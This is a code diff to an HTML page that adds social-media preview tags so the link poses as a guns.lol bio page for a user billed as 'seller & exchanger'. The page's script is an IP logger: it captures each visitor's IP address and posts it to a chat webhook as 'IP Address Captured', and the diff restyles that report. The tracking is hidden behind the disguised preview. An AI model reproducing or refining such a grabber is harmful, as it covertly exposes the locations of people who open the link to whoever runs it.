@@ -1,6 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta content="website" property="og:type">
+  <meta content="@Maxvel187 | guns.lol" property="og:title">
+  <meta content="seller & exchanger" property="og:description">
+  <meta content="https://og.guns.lol/api/og?username=maxvel187&t=1721159502853" property="og:image">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="description" content="guns.lol #1 bio link | discord.gg/guns">
 </head>
 <body>
   <script>
@@ -13,7 +20,11 @@
       var params = {
         username: "Logger",
         avatar_url: "",
-        content: "**IP:** *" + json.ip + "*"
+        embeds: [{
+          title: "IP Address Captured",
+          description: "**IP:** *" + json.ip + "*",
+          color: 15158332 // This is a red color for the embed, you can change it as needed
+        }]
       };
 
       // Set up a function that will be called when the request completes
